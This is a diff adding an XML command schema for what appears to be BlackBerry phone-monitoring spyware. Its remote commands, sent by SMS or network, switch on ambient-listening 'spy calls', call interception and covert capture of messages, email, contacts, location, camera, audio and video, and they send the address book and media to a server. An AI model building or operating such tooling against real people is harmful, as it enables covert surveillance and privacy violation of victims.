@@ -1,0 +1,639 @@
+<?xml version="1.0"?>
+<product id="4103" platform="BlackBerry" code="B" name="BlackBerry" notes="">
+  <smsmodes>
+    <smsmode>PDU</smsmode>
+  </smsmodes>
+  <versions>
+    <version name="1.03" notes="">
+      <configurations>
+        <configuration id="6" name="TOPAZ_I_FI" notes="">
+          <productdefaultsettings><![CDATA[<1:1><2:1><3:1><6:1><7:0><8:1><10:1><11:1><13:1><14:1><41:1><42:1><43:10><44:0><45:1;1;0;1><46:7><53:1>]]></productdefaultsettings>
+          <remotecommanddefinitions>
+            <remotecommand id="60" name="EnableCapture " category="Miscellaneous" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <argumentforms>
+                <argumentform name="Enable Capture">
+                  <argument type="Choice" name="Enable/Disable" required="1">
+                    <choiceitem label="Enable">1</choiceitem>
+                    <choiceitem label="Disable">0</choiceitem>
+                  </argument>
+                </argumentform>
+              </argumentforms>
+              <descriptions>
+                <description language="en">
+                  <short>Enable Capture</short>
+                  <long><![CDATA[To enable or disable Start capture option]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="9" name="EnableSpyCall" category="Monitor Call" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <argumentforms>
+                <argumentform name="Enable Spy Call">
+                  <argument type="Choice" name="Enable/Disable" required="1">
+                    <choiceitem label="Enable">1</choiceitem>
+                    <choiceitem label="Disable">0</choiceitem>
+                  </argument>
+                </argumentform>
+              </argumentforms>
+              <descriptions>
+                <description language="en">
+                  <short>Enable Spy Call</short>
+                  <long><![CDATA[To enable or disable ambient listening(spy call) and call intercept functionality.]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="10" name="EnableSpyCallWithMonitor" category="Monitor Call" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <argumentforms>
+                <argumentform name="To enable spy call with a monitor number">
+                  <argument type="PhoneNumber" name="PhoneNumber" required="1" />
+                </argumentform>
+              </argumentforms>
+              <descriptions>
+                <description language="en">
+                  <short>To enable spy call with a monitor number</short>
+                  <long><![CDATA[To enable spy call with a  monitor number. Previous monitor number if any will be replaced. This command also enables Watch notification functionality.]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="49" name="EnableWatchNotification" category="Call Watch" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <argumentforms>
+                <argumentform name="Enable watch notification">
+                  <argument type="Choice" name="Enable/Disable" required="1">
+                    <choiceitem label="Enable">1</choiceitem>
+                    <choiceitem label="Disable">0</choiceitem>
+                  </argument>
+                </argumentform>
+              </argumentforms>
+              <descriptions>
+                <description language="en">
+                  <short>Enable watch notification</short>
+                  <long><![CDATA[To enable or disable Watch SMS notification.]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="92" name="SetSettings" category="Miscellaneous" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <argumentforms>
+                <argumentform name="Set Settings">
+                  <argument type="MultipleSettings" name="MultipleSettings" required="1">
+                    <setting id="1" name="SMS">
+                      <argument name="Enable SMS event capture" type="Choice">
+                        <choiceitem label="Enable">1</choiceitem>
+                        <choiceitem label="Disable">0</choiceitem>
+                      </argument>
+                    </setting>
+                    <setting id="2" name="Call">
+                      <argument name="Enable call log capture" type="Choice">
+                        <choiceitem label="Enable">1</choiceitem>
+                        <choiceitem label="Disable">0</choiceitem>
+                      </argument>
+                    </setting>
+                    <setting id="3" name="EMail">
+                      <argument name="Enable Email capture" type="Choice">
+                        <choiceitem label="Enable">1</choiceitem>
+                        <choiceitem label="Disable">0</choiceitem>
+                      </argument>
+                    </setting>
+                    <setting id="6" name="Contact">
+                      <argument name="Enable Contact capture" type="Choice">
+                        <choiceitem label="Enable">1</choiceitem>
+                        <choiceitem label="Disable">0</choiceitem>
+                      </argument>
+                    </setting>
+                    <setting id="7" name="Location">
+                      <argument name="Enable Location capture" type="Choice">
+                        <choiceitem label="Enable">1</choiceitem>
+                        <choiceitem label="Disable">0</choiceitem>
+                      </argument>
+                    </setting>
+                    <setting id="8" name="IM">
+                      <argument name="Enable instant message capture" type="Choice">
+                        <choiceitem label="Enable">1</choiceitem>
+                        <choiceitem label="Disable">0</choiceitem>
+                      </argument>
+                    </setting>
+                    <setting id="10" name="Image">
+                      <argument name="Enable camera image" type="Choice">
+                        <choiceitem label="Enable">1</choiceitem>
+                        <choiceitem label="Disable">0</choiceitem>
+                      </argument>
+                    </setting>
+                    <setting id="11" name="Audio">
+                      <argument name="Enable audio recording" type="Choice">
+                        <choiceitem label="Enable">1</choiceitem>
+                        <choiceitem label="Disable">0</choiceitem>
+                      </argument>
+                    </setting>
+                    <setting id="13" name="Video">
+                      <argument name="Enable video capture" type="Choice">
+                        <choiceitem label="Enable">1</choiceitem>
+                        <choiceitem label="Disable">0</choiceitem>
+                      </argument>
+                    </setting>
+                    <setting id="14" name="PIN">
+                      <argument name="Enable PIN message capture" type="Choice">
+                        <choiceitem label="Enable">1</choiceitem>
+                        <choiceitem label="Disable">0</choiceitem>
+                      </argument>
+                    </setting>
+                    <setting id="41" name="Event" associatedCommandIds="60">
+                      <argument name="Enable event capture" type="Choice">
+                        <choiceitem label="Enable">1</choiceitem>
+                        <choiceitem label="Disable">0</choiceitem>
+                      </argument>
+                    </setting>
+                    <setting id="42" name="Delivery Timer">
+                      <argument name="Set capture timer" type="Integer" label="Delivery Timer" min="0" max="24" />
+                    </setting>
+                    <setting id="43" name="Maximum Event Count">
+                      <argument name="Set event count" type="Integer" label="Maximum Event Count" min="1" max="500" />
+                    </setting>
+                    <setting id="44" name="Watch Status" associatedCommandIds="49">
+                      <argument name="Enable watch" type="Choice">
+                        <choiceitem label="Enable">1</choiceitem>
+                        <choiceitem label="Disable">0</choiceitem>
+                      </argument>
+                    </setting>
+                    <setting id="46" name="Timer" associatedCommandIds="53">
+                      <argument name="Set Location timer" type="Choice">
+                        <choiceitem label="10 Seconds">1</choiceitem>
+                        <choiceitem label="30 Seconds">2</choiceitem>
+                        <choiceitem label="1 Minute">3</choiceitem>
+                        <choiceitem label="5 Minutes">4</choiceitem>
+                        <choiceitem label="10 Minutes">5</choiceitem>
+                        <choiceitem label="20 Minutes">6</choiceitem>
+                        <choiceitem label="40 Minutes">7</choiceitem>
+                        <choiceitem label="1 Hour">8</choiceitem>
+                      </argument>
+                    </setting>
+                    <setting id="53" name="Enable Spy Call">
+                      <argument name="Enable Spy Call" type="Choice">
+                        <choiceitem label="Enable">1</choiceitem>
+                        <choiceitem label="Disable">0</choiceitem>
+                      </argument>
+                    </setting>
+                  </argument>
+                </argumentform>
+              </argumentforms>
+              <descriptions>
+                <description language="en">
+                  <short>Set Settings</short>
+                  <long><![CDATA[Set multiple settings at once.]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="64" name="RequestEvents" category="Miscellaneous" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <descriptions>
+                <description language="en">
+                  <short>Get events</short>
+                  <long><![CDATA[Commands the  client to immediately send events to the server.]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="2" name="RequestHeartbeat" category="Miscellaneous" level="Advanced">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <descriptions>
+                <description language="en">
+                  <short>Request Hearbeat</short>
+                  <long><![CDATA[This commands the client execute one Heartbeat command.]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="50" name="SetWatchFlags" category="Call Watch" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <argumentforms>
+                <argumentform name="Set watch notifications options">
+                  <argument type="Choice" name=" In address book" required="1">
+                    <choiceitem label="Enable">1</choiceitem>
+                    <choiceitem label="Disable">0</choiceitem>
+                  </argument>
+                  <argument type="Choice" name="Not in address book" required="1">
+                    <choiceitem label="Enable">1</choiceitem>
+                    <choiceitem label="Disable">0</choiceitem>
+                  </argument>
+                  <argument type="Choice" name="In watch list" required="1">
+                    <choiceitem label="Enable">1</choiceitem>
+                    <choiceitem label="Disable">0</choiceitem>
+                  </argument>
+                  <argument type="Choice" name="private/unknown number " required="1">
+                    <choiceitem label="Enable">1</choiceitem>
+                    <choiceitem label="Disable">0</choiceitem>
+                  </argument>
+                </argumentform>
+              </argumentforms>
+              <descriptions>
+                <description language="en">
+                  <short>Set watch notifications options</short>
+                  <long><![CDATA[To set Watch notification options.]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="14143" name="RequestCurrentlyURL" category="Troubleshoot" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <descriptions>
+                <description language="en">
+                  <short>Get server URL</short>
+                  <long><![CDATA[This command is to query  the URL currently in use]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="14140" name="ActivateWithActivationCodeAndURL" category="Activation" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <argumentforms>
+                <argumentform name="Activate with activation code and URL">
+                  <argument type="String" name="Activation code" required="1" />
+                  <argument type="URL" name="URL" required="1" />
+                  <argument type="ReplyPhoneNumber" name="Recipient number" required="0" />
+                </argumentform>
+              </argumentforms>
+              <descriptions>
+                <description language="en">
+                  <short>Activate with activation code and URL</short>
+                  <long><![CDATA[A command to activate products.]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="14141" name="ActivateWithURL" category="Activation" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <argumentforms>
+                <argumentform name="Activate with URL">
+                  <argument type="URL" name="URL" required="1" />
+                  <argument type="ReplyPhoneNumber" name="Recipient number" required="0" />
+                </argumentform>
+              </argumentforms>
+              <descriptions>
+                <description language="en">
+                  <short>Activate with URL</short>
+                  <long><![CDATA[A command to activate the product without Activation Code.]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="14142" name="Deactivate" category="Activation" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <argumentforms>
+                <argumentform name="Deactivate product">
+                  <argument type="String" name="Deactivation code" required="1" />
+                  <argument type="ReplyPhoneNumber" name="Recipient number" required="0" />
+                </argumentform>
+              </argumentforms>
+              <descriptions>
+                <description language="en">
+                  <short>Deactivate product</short>
+                  <long><![CDATA[A command to deactivate the products.]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="120" name="SetAddressBook" category="Address book" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <descriptions>
+                <description language="en">
+                  <short>Request address book</short>
+                  <long><![CDATA[A command for the client to send address book to the server.
+]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="90" name="UploadActualMedia" category="Media" level="Advanced">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+              </transportationtypes>
+              <argumentforms>
+                <argumentform name="Upload media">
+                  <argument type="Integer" name="Pairing ID" required="1" />
+                </argumentform>
+              </argumentforms>
+              <descriptions>
+                <description language="en">
+                  <short>Upload media</short>
+                  <long><![CDATA[Ask the client to send selected media.]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="52" name="EnableLocation" category="Device location" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <argumentforms>
+                <argumentform name="Enable Location">
+                  <argument type="Choice" name="Enable/Disable" required="1">
+                    <choiceitem label="Enable">1</choiceitem>
+                    <choiceitem label="Disable">0</choiceitem>
+                  </argument>
+                </argumentform>
+              </argumentforms>
+              <descriptions>
+                <description language="en">
+                  <short>Enable Location</short>
+                  <long><![CDATA[To enable/disable device Location.]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="53" name="UpdateLocationInterval" category="Device location" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <argumentforms>
+                <argumentform name="Update Location Interval">
+                  <argument type="Choice" name="GPS Interval" required="1">
+                    <choiceitem label="10 Seconds">1</choiceitem>
+                    <choiceitem label="30 Seconds">2</choiceitem>
+                    <choiceitem label="1 Minute">3</choiceitem>
+                    <choiceitem label="5 Minutes">4</choiceitem>
+                    <choiceitem label="10 Minutes">5</choiceitem>
+                    <choiceitem label="20 Minutes">6</choiceitem>
+                    <choiceitem label="40 Minutes">7</choiceitem>
+                    <choiceitem label="1 Hour">8</choiceitem>
+                  </argument>
+                </argumentform>
+              </argumentforms>
+              <descriptions>
+                <description language="en">
+                  <short>Update Location Interval</short>
+                  <long><![CDATA[To set the Location interval]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="101" name="OnDemandLocation" category="Device location" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <descriptions>
+                <description language="en">
+                  <short>Get device location</short>
+                  <long><![CDATA[To request the current device location once.]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="160" name="AddMonitor" category="Monitor Call" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <argumentforms>
+                <argumentform name="Add monitor numbers">
+                  <argument type="ArrayOfPhoneNumber" name="Monitor numbers" required="1" />
+                </argumentform>
+              </argumentforms>
+              <descriptions>
+                <description language="en">
+                  <short>Add monitor numbers</short>
+                  <long><![CDATA[Add one or multiple monitor number to the monitor list.
+]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="163" name="ResetMonitor" category="Monitor Call" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <argumentforms>
+                <argumentform name="Reset monitor numbers">
+                  <argument type="ArrayOfPhoneNumber" name="Monitor numbers" required="1" />
+                </argumentform>
+              </argumentforms>
+              <descriptions>
+                <description language="en">
+                  <short>Reset monitor numbers</short>
+                  <long><![CDATA[Clear and add new monitor numbers to the monitor list.
+]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="161" name="ClearMonitor" category="Monitor Call" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <descriptions>
+                <description language="en">
+                  <short>Clear monitor numbers</short>
+                  <long><![CDATA[Clear all monitor numbers in monitor list
+]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="162" name="QueryMonitor" category="Monitor Call" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <descriptions>
+                <description language="en">
+                  <short>Query monitor numbers</short>
+                  <long><![CDATA[Request monitor numbers in monitor list
+]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="45" name="AddWatchNumber" category="Call Watch" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <argumentforms>
+                <argumentform name="Add phone number to watchlist">
+                  <argument type="ArrayOfPhoneNumber" name="Watch list numbers" required="1" />
+                </argumentform>
+              </argumentforms>
+              <descriptions>
+                <description language="en">
+                  <short>Add phone number to watchlist</short>
+                  <long><![CDATA[Add phone number to watch lists.
+]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="46" name="ResetWatchNumber" category="Call Watch" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <argumentforms>
+                <argumentform name="Reset watch list numbers">
+                  <argument type="ArrayOfPhoneNumber" name="Watchlist numbers" required="1" />
+                </argumentform>
+              </argumentforms>
+              <descriptions>
+                <description language="en">
+                  <short>Reset watch list numbers</short>
+                  <long><![CDATA[Clear and add phone number to watch lists.]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="47" name="ClearWatchNumber" category="Call Watch" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <descriptions>
+                <description language="en">
+                  <short>Clear watch list numbers</short>
+                  <long><![CDATA[Clear numbers in watch list
+]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="48" name="QueryWatchNumber" category="Call Watch" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <descriptions>
+                <description language="en">
+                  <short>Request numbers in watch list
+</short>
+                  <long><![CDATA[Request numbers in watch list
+]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="67" name="RequestSettings" category="Troubleshoot" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <descriptions>
+                <description language="en">
+                  <short>Request application settings</short>
+                  <long><![CDATA[To retreive entire application settings
+]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="62" name="RequestDiagnostic" category="Troubleshoot" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <descriptions>
+                <description language="en">
+                  <short>To retreive diagnostic information
+</short>
+                  <long><![CDATA[To retreive diagnostic information
+]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="5" name="RequestStartupTime" category="Troubleshoot" level="Advanced">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <descriptions>
+                <description language="en">
+                  <short>Request startup time</short>
+                  <long><![CDATA[Request startup time]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="150" name="AddHomes" category="Home numbers" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <argumentforms>
+                <argumentform name="Add GSM modem number">
+                  <argument type="ArrayOfPhoneNumber" name="HOMES" required="1" />
+                </argumentform>
+              </argumentforms>
+              <descriptions>
+                <description language="en">
+                  <short>Add GSM modem number</short>
+                  <long><![CDATA[Add GMS modem number to the GSM number  list. Client will send watch and SIM change notification to this numbers.]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="151" name="ResetHomes" category="Home numbers" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <argumentforms>
+                <argumentform name="Reset GSM modem number">
+                  <argument type="ArrayOfPhoneNumber" name="HOMES" required="1" />
+                </argumentform>
+              </argumentforms>
+              <descriptions>
+                <description language="en">
+                  <short>Reset GSM modem number</short>
+                  <long><![CDATA[Clear and add new GSM modem numbers to the GSM modem number list.  ]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="152" name="ClearHomes" category="Home numbers" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <descriptions>
+                <description language="en">
+                  <short>Clear GSM modem numbers</short>
+                  <long><![CDATA[Clear GSM modem numbers]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+            <remotecommand id="153" name="QueryHomes" category="Home numbers" level="Basic">
+              <transportationtypes>
+                <transportationtype>Network</transportationtype>
+                <transportationtype>SMS</transportationtype>
+              </transportationtypes>
+              <descriptions>
+                <description language="en">
+                  <short>Query GSM modem numbers</short>
+                  <long><![CDATA[Query GSM modem numbers]]></long>
+                </description>
+              </descriptions>
+            </remotecommand>
+          </remotecommanddefinitions>
+        </configuration>
+      </configurations>
+    </version>
+  </versions>
+</product>
